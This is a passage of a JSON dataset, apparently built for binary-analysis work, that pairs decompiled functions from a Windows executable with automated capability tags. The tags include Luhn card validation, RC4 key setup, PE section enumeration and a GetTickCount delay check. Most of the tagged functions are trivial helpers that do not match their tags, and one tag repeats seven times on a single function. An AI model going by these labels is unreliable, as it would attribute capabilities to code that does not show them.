        "decompiled_code": "\nint32_t __fastcall fcn.00401720(int32_t param_1)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_1 + 0x18) < 0x10) {\n        var_8h = param_1 + 4;\n    }\n    else {\n        var_8h = *(param_1 + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 98
    },
    "00401990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401990(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.004026c0(arg_8h, arg_ch, arg_10h, in_ECX + 8);\n    return arg_ch * 0x1c + arg_8h;\n}\n",
        "token_count": 94
    },
    "004019c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019c0(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint *arg_8h_00;\n    uint var_8h;\n    \n    arg_8h_00 = &arg_8h;\n    fcn.00402160();\n    fcn.004020f0(arg_8h_00);\n    fcn.00402160(&arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 99
    },
    "00401a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a00(uint *param_1)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = 1;\n    arg_8h = *param_1;\n    fcn.004021b0(arg_8h);\n    fcn.00401160(arg_8h, uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "00401c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401c50(int32_t param_1)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_1 + 0x18) < 0x10) {\n        var_8h = param_1 + 4;\n    }\n    else {\n        var_8h = *(param_1 + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 99
    },
    "00401c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c90(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b28(arg_8h);\n    return;\n}\n",
        "token_count": 43
    },
    "00401ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00401ce0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004024b0(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00401d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d00(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00402740(arg_8h, arg_ch, in_ECX + 8);\n    return;\n}\n",
        "token_count": 64
    },
    "00402170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402170(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b28(arg_8h);\n    return;\n}\n",
        "token_count": 42
    },
    "004021b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021b0(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b28(arg_8h);\n    return;\n}\n",
        "token_count": 43
    },
    "00402610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402610(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    cVar1 = fcn.00401200();\n    if (cVar1 == '\\0') {\n        fcn.004039a3();\n    }\n    uVar4 = arg_8h * 0x1c + *(in_ECX + 4);\n    iVar2 = fcn.004011b0();\n    if ((*(iVar2 + 0x10) <= uVar4 && uVar4 != *(iVar2 + 0x10)) ||\n       (iVar2 = *(in_ECX + 4),  iVar3 = fcn.004011b0(),  arg_8h * 0x1c + iVar2 < *(iVar3 + 0xc))) {\n        fcn.004039a3();\n    }\n    *(in_ECX + 4) = arg_8h * 0x1c + *(in_ECX + 4);\n    return in_ECX;\n}\n",
        "token_count": 262
    },
    "004026c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004026c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    unkuint3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = in_ECX;\n    uVar1 = fcn.004029b0(&arg_8h, &arg_8h, _auStack8);\n    fcn.004029c0(arg_8h, arg_ch, arg_10h, arg_14h, uVar1, 0);\n    return;\n}\n",
        "token_count": 156
    },
    "00402740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402740(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004029b0(&arg_8h, &arg_ch);\n    fcn.00402aa0(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 94
    },
    "00402780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402780(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00402ad0(arg_8h, arg_ch, arg_10h, in_ECX + 8);\n    return;\n}\n",
        "token_count": 75
    },
    "004027b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint arg_10h_00;\n    \n    arg_10h_00 = arg_10h;\n    arg_ch_00 = fcn.00402b20(&arg_ch);\n    arg_8h_00 = fcn.00402b20(&arg_8h);\n    fcn.00402b40(arg_8h_00, arg_ch_00, arg_10h_00);\n    return;\n}\n",
        "token_count": 136
    },
    "004027e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004027e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_18h;\n    uint8_t *puVar2;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    unkuint3 in_ECX;\n    uint32_t noname_3;\n    uint arg_10h_00;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = in_ECX;\n    uVar1 = fcn.00402b80(&arg_10h);\n    auStack8 = CONCAT12(uVar1, auStack8._0_2_);\n    _auStack8 = _auStack8 & 0xff000000 | auStack8;\n    arg_18h = uVar1;\n    puVar2 = fcn.00402b70(auStack8 + 1);\n    noname_3 = *puVar2;\n    arg_10h_00 = arg_10h;\n    arg_ch_00 = fcn.00402b20(&arg_ch);\n    arg_8h_00 = fcn.00402b20(&arg_8h);\n    fcn.00402b90(arg_8h_00, arg_ch_00, arg_10h_00, noname_3, arg_18h);\n    return;\n}\n",
        "token_count": 339
    },
    "00402990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402990(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004010e0(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00402a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00401100(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00402aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402aa0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00402c30(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00402ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402ad0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    unkuint3 in_ECX;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = in_ECX;\n    uVar1 = fcn.00402b80(&arg_10h, _auStack8);\n    uVar4 = 0;\n    uVar7 = uVar1;\n    uVar5 = arg_10h;\n    uVar6 = arg_14h;\n    uVar2 = fcn.00402b20(&arg_ch);\n    uVar3 = fcn.00402b20(&arg_8h);\n    fcn.00402c70(uVar3, uVar2, uVar5, uVar6, uVar7, uVar4);\n    return;\n}\n",
        "token_count": 260
    },
    "00402b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402b20(uint arg_8h)\n\n{\n    uint var_1h;\n    \n    fcn.00402d70(arg_8h);\n    return;\n}\n",
        "token_count": 59
    },
    "00402b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b40(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x1c) {\n        fcn.00402bf0(arg_10h);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00402b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402b90(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint arg_18h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = arg_10h + ((arg_ch - arg_8h) / 0x1c) * -0x1c;\n    arg_10h_00 = fcn.00402b20(&arg_10h);\n    fcn.00402d80(arg_8h, arg_ch, arg_10h_00);\n    return iVar1;\n}\n",
        "token_count": 154
    },
    "00402c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid fcn.00402c70(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    int32_t var_10h_2;\n    uint var_14h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_18h_2;\n    int32_t var_14h;\n    uchar *puStack20;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42f9e0;\n    var_ch_3 = *in_FS_OFFSET;\n    var_18h_2 = *0x4380e0 ^ &stack0xfffffffc;\n    puStack20 = &stack0xffffffb4;\n    *in_FS_OFFSET = &var_ch_3;\n    var_14h = var_10h_2;\n    fcn.00401390();\n    var_4h = 0;\n    for (; var_8h != var_ch_2; var_8h = var_8h + 0x1c) {\n        fcn.00402c10(var_10h_2, &var_34h);\n        fcn.00402e60(var_10h_2, var_8h);\n        var_10h_2 = var_10h_2 + 0x1c;\n    }\n    var_4h = 0xffffffff;\n    fcn.00401440();\n    *in_FS_OFFSET = var_ch_3;\n    fcn.004034d8(var_10h_2);\n    return;\n}\n",
        "token_count": 430
    },
    "00402d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402d80(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    while (arg_8h != arg_ch) {\n        arg_ch = arg_ch + -0x1c;\n        arg_10h = arg_10h + -0x1c;\n        fcn.00402e60(arg_10h, arg_ch);\n    }\n    return arg_10h;\n}\n",
        "token_count": 104
    },
    "00402e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e80(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_stack_ffffffac;\n    uint var_3ch;\n    uint var_38h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = *0x4380e0 ^ &stack0xfffffffc;\n    if (in_ECX != arg_8h) {\n        cVar1 = fcn.00402f90();\n        if (cVar1 == '\\0') {\n            fcn.00401400(in_ECX);\n            fcn.00402bf0(arg_8h);\n            in_stack_ffffffac = &var_38h;\n            fcn.00402bf0(in_stack_ffffffac);\n            fcn.00401440();\n        }\n        else {\n            var_18h = *(in_ECX + 4);\n            var_14h = *(in_ECX + 8);\n            var_10h = *(in_ECX + 0xc);\n            var_ch = *(in_ECX + 0x10);\n            *(in_ECX + 4) = *(arg_8h + 4);\n            *(in_ECX + 8) = *(arg_8h + 8);\n            *(in_ECX + 0xc) = *(arg_8h + 0xc);\n            *(in_ECX + 0x10) = *(arg_8h + 0x10);\n            *(arg_8h + 4) = var_18h;\n            *(arg_8h + 8) = var_14h;\n            *(arg_8h + 0xc) = var_10h;\n            *(arg_8h + 0x10) = var_ch;\n            var_4h = *(in_ECX + 0x14);\n            *(in_ECX + 0x14) = *(arg_8h + 0x14);\n            *(arg_8h + 0x14) = var_4h;\n            var_1ch = *(in_ECX + 0x18);\n            *(in_ECX + 0x18) = *(arg_8h + 0x18);\n            *(arg_8h + 0x18) = var_1ch;\n        }\n    }\n    fcn.004034d8(in_stack_ffffffac);\n    return;\n}\n",
        "token_count": 568
    },
    "004039be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.004039be(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00406580(0x435128, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.004055e8();\n        fcn.00405700(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004055e8();\n        arg_8h_00 = fcn.0040579d(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004055e8();\n        uVar4 = fcn.004059e5(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004055e8();\n        fcn.00405839(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00403a5a();\n    }\n    fcn.004065c5();\n    return;\n}\n",
        "token_count": 459
    },
    "00403a5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403a5a(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004055e8();\n    fcn.0040576e(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 56
    },
    "00403a6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a6d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040682c(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 55
    },
    "00403a86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a86(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00406849(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00403a9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a9f(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00406849(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 46
    },
    "00403ab7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ab7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00406866(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00403ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ad0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00406866(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "0040679c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040679c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406580(0x435200, 0x10);\n    iVar1 = fcn.004055e8();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.00404b77();\n        *puVar2 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n    }\n    else {\n        fcn.004056bf(iVar1);\n        *(unaff_EBP + -4) = 0;\n        arg_8h_00 = fcn.0040579d(iVar1);\n        uVar3 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar3;\n        fcn.00405839(arg_8h_00, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00406824();\n    }\n    fcn.004065c5();\n    return;\n}\n",
        "token_count": 437
    },
    "0040682c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040682c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040679c(fcn.004059e5, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00406849": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406849(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040679c(fcn.0040dc93, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00406866": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406866(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040679c(fcn.0040ea49, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00406883": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406883(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040679c(fcn.004059e5, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "0040689f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040689f(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040679c(fcn.0040dc93, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "004068bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004068bb(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040679c(fcn.0040ea49, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "00407d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407d58(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((arg_8h == NULL) || (*0x8f96e0 == 0)) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x8f96e0;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 154
    },
    "00407d94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407d94(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((arg_8h == NULL) || (*0x8f96dc == 0)) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x8f96dc;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 152
    },
    "00407f81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f81(uint arg_8h)\n\n{\n    fcn.00407e55(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00408b53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408b67)\n// WARNING: Removing unreachable block (ram,0x00408b6d)\n// WARNING: Removing unreachable block (ram,0x00408b6f)\n\nvoid fcn.00408b53(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004127d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004127d7(uint *arg_8h)\n\n{\n    uint *arg_ch;\n    char *arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (**0x8f9ce0 == '\\0') {\n        arg_ch = &var_10h;\n        arg_8h_00 = \" throw(\";\n        fcn.00411db9(\" throw(\");\n        fcn.00411fba(arg_8h_00, arg_ch);\n    }\n    else {\n        if (**0x8f9ce0 == 'Z') {\n            *0x8f9ce0 = *0x8f9ce0 + 1;\n            *arg_8h = 0;\n            arg_8h[1] = var_4h & 0xffff0000;\n            return arg_8h;\n        }\n        arg_ch = fcn.004126fb(&var_8h);\n        arg_8h_00 = \" throw(\";\n        fcn.00412469(&var_10h, \" throw(\", arg_ch);\n    }\n    fcn.0041248d(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 283
    },
    "0041ea90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ea90(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041e9e8(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "0041ec0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec0f(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041eb67(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "0041fd11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fd11(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x439034;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "0041fd4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fd4a(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x439038;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0041fd83": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fd83(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.00404b77();\n        *puVar1 = 0x16;\n        fcn.0040397d(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x439030;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "00404208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404208(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00409de4(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00401510": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
